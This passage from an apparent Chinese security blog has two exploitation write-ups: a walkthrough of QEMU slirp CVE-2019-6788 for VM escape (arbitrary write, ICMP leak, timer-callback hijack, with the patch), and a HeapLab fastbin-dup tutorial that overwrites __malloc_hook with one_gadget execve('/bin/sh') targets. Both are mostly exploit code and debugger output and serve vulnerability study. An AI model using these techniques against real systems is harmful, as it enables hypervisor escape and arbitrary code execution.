123456789101112131415161718192021222324252627 static struct ip *ip_reass(Slirp *slirp, struct ip *ip, struct ipq *fp){... insert: while (q != (struct ipasfrag*)&amp;fp-&gt;frag_link) { struct mbuf *t = dtom(slirp, q); q = (struct ipasfrag *) q-&gt;ipf_next; m_cat(m, t); //&lt;--------------- 3 }...}voidm_cat(struct mbuf *m, struct mbuf *n){ /* * If there's no room, realloc */ if (M_FREEROOM(m) &lt; n-&gt;m_len) m_inc(m, m-&gt;m_len + n-&gt;m_len); memcpy(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len);//&lt;--------- 4 m-&gt;m_len += n-&gt;m_len; m_free(n);} 这里n-&gt;m_data是这里n-&gt;m_data, n-&gt;m_len都是根据后面数据包的data获取的，是我们可以控制的。如果m-&gt;m_data这个指针也可以被我们控制，那么就可以想写哪儿就写哪儿了。 同时由于存在着堆溢出，可以通过so_rcv结构往后面一直覆盖。结合这两点我们便可以覆盖mbuf-&gt;m_data，从而以实现任意地址写。 123456789101112131415161718192021222324252627282930313233343536373839404142pwndbg&gt; p so_rcv$1 = (struct sbuf *) 0x7f1ffe20dba8pwndbg&gt; x/4gx 0x7f1ffe20dba80x7f94c420dba8: 0x0000223800000000 0x00007f1fe43eb7d00x7f94c420dbb8: 0x00007f1fe43eb7d0 0x00007f1fe43eb7d0pwndbg&gt; x/32gx 0x00007f1fe43eb7d0+0x22380x7f1fe43eda08: 0x0000000000000675 0x00007f1fe43eb1600x7f1fe43eda18: 0x00007f1fe43ee080 0x00000000000000000x7f1fe43eda28: 0x0000000000000000 0x000006080000000c0x7f1fe43eda38: 0x0000000000000000 0x00007f1fe43edab0 #&lt;&lt;------原来的数据存储的地址：0x...3edab00x7f1fe43eda48: 0x0000000000000318 0x000055cc6fc6b660 #&lt;&lt;------ 长度为0x3180x7f1fe43eda58: 0x0000000000000000 0xffffffffffffffff0x7f1fe43eda68: 0x0000000000000000 0x00000000000000000x7f1fe43eda78: 0x0000000000000000 0x00000000000000000x7f1fe43eda88: 0xe43ee0e00f02000a 0xe43ee0e000007f1f0x7f1fe43eda98: 0x0318014500007f1f 0x22bbffff0000dead0x7f1fe43edaa8: 0x0100007f0100007f 0x41414141414141410x7f1fe43edab8: 0x4141414141414141 0x41414141414141410x7f1fe43edac8: 0x4141414141414141 0x41414141414141410x7f1fe43edad8: 0x4141414141414141 0x41414141414141410x7f1fe43edae8: 0x4141414141414141 0x41414141414141410x7f1fe43edaf8: 0x4141414141414141 0x4141414141414141.........pwndbg&gt; x/32gx 0x00007f1fe43eb7d0+0x22380x7f1fe43eda08: 0x0000000000000675 0x00000000000000000x7f1fe43eda18: 0x0000000000000000 0x00000000000000000x7f1fe43eda28: 0x0000000000000000 0x00000608000000000x7f1fe43eda38: 0x0000000000000000 0x00007f1fe4000b00 #&lt;&lt;------这里已经被修改成0x...000b000x7f1fe43eda48: 0x0000000000000318 0x000055cc6fc6b660 #&lt;&lt;------ 长度为0x3180x7f1fe43eda58: 0x0000000000000000 0xffffffffffffffff0x7f1fe43eda68: 0x0000000000000000 0x00000000000000000x7f1fe43eda78: 0x0000000000000000 0x00000000000000000x7f1fe43eda88: 0xe43ee0e00f02000a 0xe43ee0e000007f1f0x7f1fe43eda98: 0x0318014500007f1f 0x22bbffff0000dead0x7f1fe43edaa8: 0x0100007f0100007f 0x41414141414141410x7f1fe43edab8: 0x4141414141414141 0x41414141414141410x7f1fe43edac8: 0x4141414141414141 0x41414141414141410x7f1fe43edad8: 0x4141414141414141 0x41414141414141410x7f1fe43edae8: 0x4141414141414141 0x41414141414141410x7f1fe43edaf8: 0x4141414141414141 0x4141414141414141 在连接113端口的时候会进入对应的routine，此时就已经将so_rcv等环境准备好了。连接后我们先发送一个原始的ip数据包，将MF标志设为1，那么qemu对应的处理模块就会等待后续数据包， 这个时候我们利用漏洞，溢出so_rcv中的sb_data，由于mbuf 和上面的结构是连续的，所以我们可以直接将mbuf结构中的m_data成员设置成我们指定的地址，那么在后面得到拼接数据包的时候就会向我们指定的地址写入后续数据包的内容，也就实现了任意地址写。 Info Leak信息泄漏其实就是想办法将一些特定的数据回传给我们，在网络模块中那自然会考虑到使用icmp服务，好像也只有icmp会“无条件”的响应我们。这里的原理和任意写是一样的，都是利用漏洞结合ip包的分片机制来修改包的位置。具体操作如下： 利用任意地址写原语在堆中先写入一个伪造的icmp数据包 准备好漏洞环境（创建对应端口的socket），再发送一个正常的icmp数据包，将其ip头中的MF标志置一（如此便会等待后续的数据包） 利用溢出覆盖2中正常icmp数据包存储的mbuf结构中的m_data，将其修改成1中伪造的数据包，即将我们伪造的数据包变成第一个包 再发送一个正常的icmp数据包，MF=0，如此便会得到icmp reply。由于mbuf中存储数据的m_data大小为0x318，所以伪造的icmp数据包后会有很多脏数据也被发送回来，我们可以借此去寻找堆的基址和代码段的基址。 这里有个问题需要解决，使用我们伪造icmp数据包时，如何通过check_sum的校验呢？ 我们先看一下slirp模块中是如何校验的： 12345678910111213141516171819202122232425262728293031323334/* * Process a received ICMP message. */voidicmp_input(struct mbuf *m, int hlen){ register struct icmp *icp; register struct ip *ip=mtod(m, struct ip *); int icmplen=ip-&gt;ip_len; Slirp *slirp = m-&gt;slirp; DEBUG_CALL(&quot;icmp_input&quot;); DEBUG_ARG(&quot;m = %p&quot;, m); DEBUG_ARG(&quot;m_len = %d&quot;, m-&gt;m_len); /* * Locate icmp structure in mbuf, and check * that its not corrupted and of at least minimum length. */ if (icmplen &lt; ICMP_MINLEN) { /* min 8 bytes payload */ freeit: m_free(m); goto end_error; } m-&gt;m_len -= hlen; m-&gt;m_data += hlen; icp = mtod(m, struct icmp *); if (cksum(m, icmplen)) { goto freeit; } ... ... } 可以看到仅使用ip头中的len去做校验，那么就可以伪造ip头中的长度设置成header的长度，因为header部分内容是固定的。如此我们便可以得到相当一部分的脏数据，现在就看这部分脏数据里面能不能获得我们想要的基址了。 经过测试，在我的环境中reply的脏数据中有一定几率是固定的内容： 于是可以通过固定地址中的数据获取heap base 和代码段段基址： 1234567891011pwndbg&gt; p &amp;qemu_clocks$2 = (QEMUClock (*)[4]) 0x55c090f43400 &lt;qemu_clocks&gt;pwndbg&gt; p &amp;qemu_timer_notify_cb$3 = (void (*)(void *, QEMUClockType)) 0x55c090226854 &lt;qemu_timer_notify_cb&gt;pwndbg&gt; p/x 0x55c090f43400-0x1015400$4 = 0x55c08ff2e000 #&lt;------text_basepwndbg&gt; p/x $4+0x2f8854$5 = 0x55c090226854 #&lt;---qemu_timer_notify_cbpwndbg&gt; p/x 0x55c090244c4b-0x55c08ff2e000$6 = 0x316c4b # memory_region_get_addr-text_base==》偏移 通过这种方式获得heap base是比较容易的，但是text base却比较难。可能出现的是不同的函数，并且text的随机化比heap粒度更细，需要根据出现的函数地址去做对应的计算。 获得程序的控制权这里使用的是一个比较经典的原语，借助qemu的时钟机制，这种方式也在许多qemu相关的漏洞利用中被使用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172void main_loop_wait(int nonblocking){ ... qemu_clock_run_all_timers();}bool qemu_clock_run_all_timers(void){ bool progress = false; QEMUClockType type; for (type = 0; type &lt; QEMU_CLOCK_MAX; type++) { if (qemu_clock_use_for_deadline(type)) { progress |= qemu_clock_run_timers(type); } } return progress;}bool qemu_clock_run_timers(QEMUClockType type){ return timerlist_run_timers(main_loop_tlg.tl[type]);//&lt;-------------- 5}bool timerlist_run_timers(QEMUTimerList *timer_list){ ... switch (timer_list-&gt;clock-&gt;type) { case QEMU_CLOCK_REALTIME: ... case QEMU_CLOCK_VIRTUAL: ... case QEMU_CLOCK_HOST: ... case QEMU_CLOCK_VIRTUAL_RT: if (!replay_checkpoint(CHECKPOINT_CLOCK_VIRTUAL_RT)) { goto out; } break; } current_time = qemu_clock_get_ns(timer_list-&gt;clock-&gt;type); qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock); while ((ts = timer_list-&gt;active_timers)) { ... /* run the callback (the timer list can be modified) */ qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock); cb(opaque); //&lt;------------------------ 6 qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock); progress = true; } ...}// util/qemu-timer.cstruct QEMUTimerList { QEMUClock *clock; QemuMutex active_timers_lock; QEMUTimer *active_timers; QLIST_ENTRY(QEMUTimerList) list; QEMUTimerListNotifyCB *notify_cb; void *notify_opaque; QemuEvent timers_done_ev;};// include/qemu/timer.hstruct QEMUTimer { int64_t expire_time; QEMUTimerList *timer_list; QEMUTimerCB *cb; void *opaque; QEMUTimer *next; int attributes; int scale;}; 通过代码大致可以看出qemu的时钟机制实现方式，main_loop_tlg是一个QEMUTimerListGroup类型的全局变量，其中存有不同定时器的QEMUTimerList。qemu会循环遍历这些定时器，check是否有到期的，有则调用cb(opaque)。由于我们已经有了任意地址写、且知道了代码段和堆的基址，我们便可以在堆中伪造一个QEMUTimerList然后覆盖全局区中main_loop_tlg或修改其成员，这样就可以执行我们的代码了。 相关符号地址借助pwntools很容易获取到： 12345678910111213141516from pwn import * elf=ELF('./qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64')libc = elf.libcsystem_addr = elf.symbols['system']print (&quot;system:&quot; , hex(system_addr))qemu_clocks=elf.symbols['qemu_clocks']print (&quot;qemu_clocks:&quot;, hex(qemu_clocks))qemu_timer_notify_cb=elf.symbols['qemu_timer_notify_cb']print (&quot;qemu_timer_notify_cb:&quot;, hex(qemu_timer_notify_cb))main_loop_tlg=elf.symbols['main_loop_tlg']print (&quot;main_loop_tlg:&quot;, hex(main_loop_tlg)) 漏洞修复原本以为会是改成先修改so_rcv-&gt;sb_cc 再memcpy，结果是在memcpy之前先通过指针比对长度，确定有空间再拷贝。或许这样可以根本上杜绝下面的memcpy出现问题吧QaQ 12345678910111213141516171819case EMU_IDENT: /* * Identification protocol as per rfc-1413 */ { struct socket *tmpso; struct sockaddr_in addr; socklen_t addrlen = sizeof(struct sockaddr_in); struct sbuf *so_rcv = &amp;so-&gt;so_rcv; if (m-&gt;m_len &gt; so_rcv-&gt;sb_datalen - (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)) { return 1; } memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len); so_rcv-&gt;sb_wptr += m-&gt;m_len; so_rcv-&gt;sb_rptr += m-&gt;m_len; 小结这个漏洞本身很简单，但是利用过程却丝毫不简单，利用IP分片机制获取malloc 原语，同时获取Arbitrary write 和Info Leak，思路很清奇。需要对linux 堆分配机制和qemu代码足够熟悉。 着实让我这个菜鸡学到很多。 What’s more： 信息泄漏那里的脏数据，有没有办法使其变得可控呢？ 脚本丢在GitHub上了。 参考链接 https://github.com/0xKira/qemu-vm-escape/ https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90 QEMU timer模块分析 一些qemu历史漏洞相关文章 Etc…","link":"/2021/07/03/cve-2019-6788-note/"},{"title":"glibc 利用之Fastbin Dup","text":"针对fastbin，利用double free在两次malloc 时获得同一个块chunk，然后在第一次拿到chunk后修改堆的结构，将假的chunk链接到当前块，之后可以通过malloc分配到假的chunk，从而实现任意地址读写，这就是所谓的Fastbin Dup。 这里拿HeapLab中的fastbin_dup 当例子，逐步分析。运行程序可以看到主窗口，先输入用户名，之后可以malloc、free以及查看target。 1234567891011x@ubuntu  fastbin_dup  ./fastbin_dup ===============| HeapLAB | Fastbin Dup===============puts() @ 0x7f5f61acaaf0Enter your username: FastbinDup1) malloc 0/72) free3) target4) quit&gt; 既然利用需要double free，那就先试试double free （实际做题时，可以盲测或者直接用ida 看free后有没有置空）， 直接malloc 一次free 两次，结果报错了：double free or corruption (fasttop) Program received signal SIGABRT, Aborted. 看下原因： 12345678910111213141516171819202122232425262728─────────────────────────────────[ BACKTRACE ]────────────────────────────────── ► f 0 7ffff7a5204a raise+202 f 1 7ffff7a530f5 abort+357 f 2 7ffff7a93f07 __libc_message+599 f 3 7ffff7a9b2aa f 4 7ffff7a9ccb4 _int_free+948 f 5 400a22 main+603 f 6 7ffff7a3e037 __libc_start_main+231────────────────────────────────────────────────────────────────────────────────pwndbg&gt; f 4#4 0x00007ffff7a9ccb4 in _int_free (av=0x7ffff7dd0b60 &lt;main_arena&gt;, p=0x603000, have_lock=0) at malloc.c:42664266 malloc_printerr (&quot;double free or corruption (fasttop)&quot;);pwndbg&gt; context codeLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────In file: /home/x/.glibc/glibc_2.30_no-tcache/malloc/malloc.c 4261 if (SINGLE_THREAD_P) 4262 { 4263 /* Check that the top of the bin is not the record we are going to 4264 add (i.e., double free). */ 4265 if (__builtin_expect (old == p, 0)) ► 4266 malloc_printerr (&quot;double free or corruption (fasttop)&quot;); 4267 p-&gt;fd = old; 4268 *fb = p; 4269 } 4270 else 4271 do──────────────────────────────────────────────────────────────────────────────── 根据代码的注释可以看到，malloc 中的_int_free 函数会检查我们释放后要添加进fastbin中的chunk是否已经是fastbin中的第一个bin，是则提示double free，否则就通过检查。ok，既然如此我们就不用第一个bin试试看： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263io.sendafter(&quot;username: &quot;, &quot;FastbinDup&quot;)io.recvuntil(&quot;&gt; &quot;)chunk_A = malloc(0x68, &quot;A&quot;*0x68)chunk_B = malloc(0x68, &quot;B&quot;*0x68)input(&quot;after malloc&quot;)free(chunk_A)free(chunk_B)input(&quot;after free normal&quot;)---pwndbg&gt; vis0x11a2000 0x0000000000000000 0x0000000000000071 ........q.......0x11a2010 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2020 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2030 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2040 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2050 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2060 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2070 0x4141414141414141 0x0000000000000071 AAAAAAAAq.......0x11a2080 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a2090 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20a0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20b0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20c0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20d0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20e0 0x4242424242424242 0x0000000000020f21 BBBBBBBB!....... &lt;-- Top chunkpwndbg&gt; fastbins fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0...pwndbg&gt; vis0x11a2000 0x0000000000000000 0x0000000000000071 ........q....... &lt;-- fastbins[0x70][1]0x11a2010 0x0000000000000000 0x4141414141414141 ........AAAAAAAA0x11a2020 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2030 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2040 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2050 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2060 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2070 0x4141414141414141 0x0000000000000071 AAAAAAAAq....... &lt;-- fastbins[0x70][0]0x11a2080 0x00000000011a2000 0x4242424242424242 . ......BBBBBBBB0x11a2090 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20a0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20b0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20c0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20d0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20e0 0x4242424242424242 0x0000000000020f21 BBBBBBBB!....... &lt;-- Top chunkpwndbg&gt; fastbins fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x11a2070 —▸ 0x11a2000 ◂— 0x00x80: 0x0pwndbg&gt; 正常的malloc 和free后，可以看到两个chunk都被放进了大小为0x70的fastbin中，且后free的在前面，也就是后入先出。那我们触发double free就free chunk_A 好了，试试看： 12345678910111213141516171819202122232425262728free(chunk_A)input(&quot;after double free&quot;)---pwndbg&gt; vis0x11a2000 0x0000000000000000 0x0000000000000071 ........q....... &lt;-- fastbins[0x70][0], fastbins[0x70][0]0x11a2010 0x00000000011a2070 0x4141414141414141 p ......AAAAAAAA0x11a2020 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2030 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2040 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2050 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2060 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2070 0x4141414141414141 0x0000000000000071 AAAAAAAAq....... &lt;-- fastbins[0x70][1]0x11a2080 0x00000000011a2000 0x4242424242424242 . ......BBBBBBBB0x11a2090 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20a0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20b0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20c0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20d0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20e0 0x4242424242424242 0x0000000000020f21 BBBBBBBB!....... &lt;-- Top chunkpwndbg&gt; fastbins fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x11a2000 —▸ 0x11a2070 ◂— 0x11a20000x80: 0x0 ok，看起来第一步已经实现了，成功布局chunk_A → chunk_B ← chunk_A ，接下来应该是将fake 地址链接到当前的fastbin中，先试试将user 的地址拉过来： 1234567891011121314151617181920212223242526272829303132333435dup=malloc(0x68, p64(elf.sym.user))input(&quot;malloc for user addr&quot;)---pwndbg&gt; ptype usertype = struct user { char username[16]; char target[16];}pwndbg&gt; p user$1 = { username = &quot;FastbinDup\\000\\000\\000\\000\\000&quot;, target = &quot;XXXXXXX\\000\\000\\000\\000\\000\\000\\000\\000&quot;}pwndbg&gt; fastbins fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x1e81000 —▸ 0x1e81070 ◂— 0x1e810000x80: 0x0pwndbg&gt; cContinuing.^Cpwndbg&gt; fastbins fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x1e81070 —▸ 0x1e81000 —▸ 0x602010 (user) ◂— 0x58585858585858 /* 'XXXXXXX' */0x80: 0x0pwndbg&gt; 看起来比较顺利，我们通过malloc后得到chunk_A， 之后将chunk_A中的fd指针指向user的地址，从而将user链入当前的bin中。后面如果能够成功的在user地址中写入内容，就算实现任意地址写了呗。 123456input(&quot;malloc for user addr&quot;)malloc(0x68,&quot;C&quot;*0x68)malloc(0x68,&quot;D&quot;*0x68)malloc(0x68,&quot;arbitrary write&quot;)---malloc(): memory corruption (fast) 看来没那么简单，这里直接崩了，ummm， 看看原因： 1234567891011121314151617181920212223242526272829─────────────────────────────────[ BACKTRACE ]────────────────────────────────── ► f 0 7f7b237b604a raise+202 f 1 7f7b237b70f5 abort+357 f 2 7f7b237f7f07 __libc_message+599 f 3 7f7b237ff2aa f 4 7f7b2380235c _int_malloc+2028 f 5 7f7b23803533 malloc+51 f 6 400976 main+431 f 7 7f7b237a2037 __libc_start_main+231────────────────────────────────────────────────────────────────────────────────pwndbg&gt; f 4#4 0x00007f7b2380235c in _int_malloc (av=av@entry=0x7f7b23b34b60 &lt;main_arena&gt;, bytes=bytes@entry=104) at malloc.c:35943594 malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);pwndbg&gt; context codeLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────In file: /home/x/.glibc/glibc_2.30_no-tcache/malloc/malloc.c 3589 REMOVE_FB (fb, pp, victim); 3590 if (__glibc_likely (victim != NULL)) 3591 { 3592 size_t victim_idx = fastbin_index (chunksize (victim)); 3593 if (__builtin_expect (victim_idx != idx, 0)) ► 3594 malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;); 3595 check_remalloced_chunk (av, victim, nb); 3596 #if USE_TCACHE 3597 /* While we're here, if we see other chunks of the same size, 3598 stash them in the tcache. */ 3599 size_t tc_idx = csize2tidx (nb);──────────────────────────────────────────────────────────────────────────────── 根据backtrace看到是在_int_malloc 的时候出问题的，根据代码来看，3592 行是在获取当前chunk的size然后判断是在fastbins中的第几个bin， 3593行则是判断当前的使用的bin和size所在的bin是否为同一个，如果不是则提示错误。 如此看来，错误应该是user这个fake bin 中表示size的字段不在0x60—0x70之间，根据上面看的user结构：两个长度为16的char数组，我们可以自己控制user.username [8:15]，将其设置成0x70bin的长度即可: 12345678910111213141516171819202122232425262728293031io.sendafter(&quot;username: &quot;, p64(0) + p64(0x71))io.recvuntil(&quot;&gt; &quot;)chunk_A = malloc(0x68, &quot;A&quot;*0x68)chunk_B = malloc(0x68, &quot;B&quot;*0x68)input(&quot;after malloc&quot;)free(chunk_A)free(chunk_B)input(&quot;after free normal&quot;)free(chunk_A)input (&quot;after double free&quot;)dup=malloc(0x68, p64(elf.sym.user))input(&quot;malloc for user addr&quot;)malloc(0x68,&quot;C&quot;*0x68)malloc(0x68,&quot;D&quot;*0x68)malloc(0x68,&quot;arbitrary write&quot;)---pwndbg&gt; p user$1 = { username = &quot;\\000\\000\\000\\000\\000\\000\\000\\000q\\000\\000\\000\\000\\000\\000&quot;, target = &quot;XXXXXXX\\000\\000\\000\\000\\000\\000\\000\\000&quot;}pwndbg&gt; cContinuing.^Cpwndbg&gt; p user$2 = { username = &quot;\\000\\000\\000\\000\\000\\000\\000\\000q\\000\\000\\000\\000\\000\\000&quot;, target = &quot;arbitrary write&quot;} 至此一个任意地址写已经实现了，下面就看一下如何实现RCE， 常规思路是通过任意写修改GOT表中malloc 或free对应的地址，改成system项尔后再填入参数调用。这里记一种新学到的招式： 在glibc中，提供了_malloc_hook 以及_free_hook，在调用malloc或free时，如果对应的hook值存在，则会先调用_malloc_hook或_free_hook指向的地址。既然如此，我们便可以overwrite 对应的地址，这样就可以直接让glibc帮我们来调用。overwrite的内容可以通过one_gadget 寻找glibc中的execve(“/bin/sh”…)，只要满足条件就可以用。 下面详细来讲： 1234567891011121314151617181920212223242526pwndbg&gt; ptype __malloc_hooktype = void *(*)(size_t, const void *)pwndbg&gt; ptype __free_hooktype = void (*)(void *, const void *)pwndbg&gt; dq &amp;__malloc_hook 2000007f6d768d3b50 0000000000000000 000000000000000000007f6d768d3b60 0000000000000000 000000000000000000007f6d768d3b70 0000000000000000 000000000000000000007f6d768d3b80 0000000000000000 000000000000000000007f6d768d3b90 0000000000000000 000000000000000000007f6d768d3ba0 0000000000000000 000000000000000000007f6d768d3bb0 0000000000000000 000000000000000000007f6d768d3bc0 000000000259d0e0 000000000000000000007f6d768d3bd0 00007f6d768d3bc0 00007f6d768d3bc000007f6d768d3be0 00007f6d768d3bd0 00007f6d768d3bd0pwndbg&gt; dq &amp;__free_hook 2000007f6d768d5e20 0000000000000000 000000000000000000007f6d768d5e30 0000000000000000 000000000000000000007f6d768d5e40 0000000000000000 000000000000000000007f6d768d5e50 0000000000000000 000000000000000000007f6d768d5e60 0000000000000000 000000000000000000007f6d768d5e70 0000000000000000 000000000000008000007f6d768d5e80 0000000000000000 000000000000000000007f6d768d5e90 0000000000000000 000000000000000000007f6d768d5ea0 0000000000000000 000000000000000000007f6d768d5eb0 0000000000000000 0000000000000000 看了__malloc_hook 和__free_hook，发现一个问题，如果把他们当作一个fake chunk，表示size的字段都是0，必然无法通过_int_malloc中的check，同时这里也不像user结构那样可以被我们控制。既然如此，那我们就向前找找，只要表示size的字段合适且能覆盖到_malloc_hook 或_free_hook就可以。这里可以借助pwndbg的find_fake_fast命令： 12345678910111213141516171819202122232425262728pwndbg&gt; find_fake_fast --helpusage: find_fake_fast [-h] addr [size]Find candidate fake fast chunks overlapping the specified address.positional arguments: addr Address of the word-sized value to overlap. size Size of fake chunks to find.optional arguments: -h, --help show this help message and exitpwndbg&gt; find_fake_fast &amp;__malloc_hook FAKE CHUNKSFake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENAAddr: 0x7f6d768d3b2dprev_size: 0x6d768cfee0000000size: 0x7ffd: 0x6d765a2a10000000bk: 0x6d765a2ed000007ffd_nextsize: 0x7fbk_nextsize: 0x00pwndbg&gt; find_fake_fast &amp;__free_hookFAKE CHUNKSpwndbg&gt; p &amp;__malloc_hook$1 = (void *(**)(size_t, const void *)) 0x7f6d768d3b50 &lt;__malloc_hook&gt;p/x 0x7f6d768d3b50-0x7f6d768d3b2d-0x10 #malloc data字段在size之后$3 = 0x13 在__malloc_hook 前成功找到一个可以充当fake fast chunk 的地址而__free_hook前则没找到合适的。如此我们在找到的地址上填充p8(any_num)*0x13+p64(cmd)即可。下面通过one_gadget查找libc.so中的execve(“/bin/sh”…) 123456789101112131415161718➜ ldd fastbin_dup linux-vdso.so.1 (0x00007ffc21493000) libc.so.6 =&gt; ../.glibc/glibc_2.30_no-tcache/libc.so.6 (0x00007ffa81a8000) ../.glibc/glibc_2.30_no-tcache/ld.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007ffae8564000)➜ one_gadget ../.glibc/glibc_2.30_no-tcache/libc.so.60xc4dbf execve(&quot;/bin/sh&quot;, r13, r12)constraints: [r13] == NULL || r13 == NULL [r12] == NULL || r12 == NULL0xe1fa1 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xe1fad execve(&quot;/bin/sh&quot;, rsi, [rax])constraints: [rsi] == NULL || rsi == NULL [[rax]] == NULL || [rax] == NULL 找到三个可以执行shell的，三个都有限制条件，对应constraints字段显示的内容。那就只能是一个一个试试看了，这里将对应的地址改成0xdeadbeef，这样在malloc走到这里时会直接跳到调试器中： 1234567891011121314151617181920212223242526272829LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────[ REGISTERS ]────────────────────────────────── RAX 0xdeadbeef RBX 0x0 RCX 0x0 RDX 0xffffffffffffff98 RDI 0x68 RSI 0x400976 (main+431) ◂— mov rdx, rax R8 0x7fff71d631f3 ◂— 0x0 R9 0x0 R10 0x7fcc3ff00720 (_nl_C_LC_CTYPE_toupper+512) ◂— add byte ptr [rax], al R11 0xa R12 0x4006e0 (_start) ◂— xor ebp, ebp R13 0x7fff71d63370 ◂— 0x1 R14 0x0 R15 0x0 RBP 0x7fff71d63290 —▸ 0x400ae0 (__libc_csu_init) ◂— push r15 RSP 0x7fff71d63228 —▸ 0x400976 (main+431) ◂— mov rdx, rax RIP 0xdeadbeef───────────────────────────────────[ DISASM ]───────────────────────────────────Invalid address 0xdeadbeef───────────────────────────────────[ STACK ]────────────────────────────────────...─────────────────────────────────[ BACKTRACE ]────────────────────────────────── ► f 0 deadbeef f 1 400976 main+431 f 2 7fcc3fdbd037 __libc_start_main+231──────────────────────────────────────────────────────────────────────────────── 可以看到r12 和 r13寄存器都不是空，且对应地址都不为空，所以第一个gadget不能满足条件。看下第二个，要求[rsp+0x50]为null，那就看下stack 12345678910111213141516pwndbg&gt; stack 1500:0000│ rsp 0x7fff71d63228 —▸ 0x400976 (main+431) ◂— mov rdx, rax01:0008│ 0x7fff71d63230 —▸ 0x7fff71d63378 —▸ 0x7fff71d64302 ◂— '/home/x/fastbin_dup/fastbin_dup'02:0010│ 0x7fff71d63238 ◂— 0x171d6326e03:0018│ 0x7fff71d63240 ◂— 0x60000000104:0020│ 0x7fff71d63248 ◂— 0x68 /* 'h' */05:0028│ 0x7fff71d63250 —▸ 0x23bc010 —▸ 0x7fcc4014fb41 (__memalign_hook+1) ◂— 0x4141414141414141 ('AAAAAAAA')06:0030│ 0x7fff71d63258 —▸ 0x23bc080 —▸ 0x23bc041 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq'07:0038│ 0x7fff71d63260 —▸ 0x23bc010 —▸ 0x7fcc4014fb41 (__memalign_hook+1) ◂— 0x4141414141414141 ('AAAAAAAA')08:0040│ 0x7fff71d63268 —▸ 0x23bc080 —▸ 0x23bc041 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq'09:0048│ 0x7fff71d63270 —▸ 0x23bc010 —▸ 0x7fcc4014fb41 (__memalign_hook+1) ◂— 0x4141414141414141 ('AAAAAAAA')0a:0050│ 0x7fff71d63278 —▸ 0x7fcc4014fb3d ◂— 0x4141414141414141 ('AAAAAAAA')0b:0058│ 0x7fff71d63280 ◂— 0x00c:0060│ 0x7fff71d63288 ◂— 0x755c2feb7db26d000d:0068│ rbp 0x7fff71d63290 —▸ 0x400ae0 (__libc_csu_init) ◂— push r150e:0070│ 0x7fff71d63298 —▸ 0x7fcc3fdbd037 (__libc_start_main+231) ◂— mov edi, eax 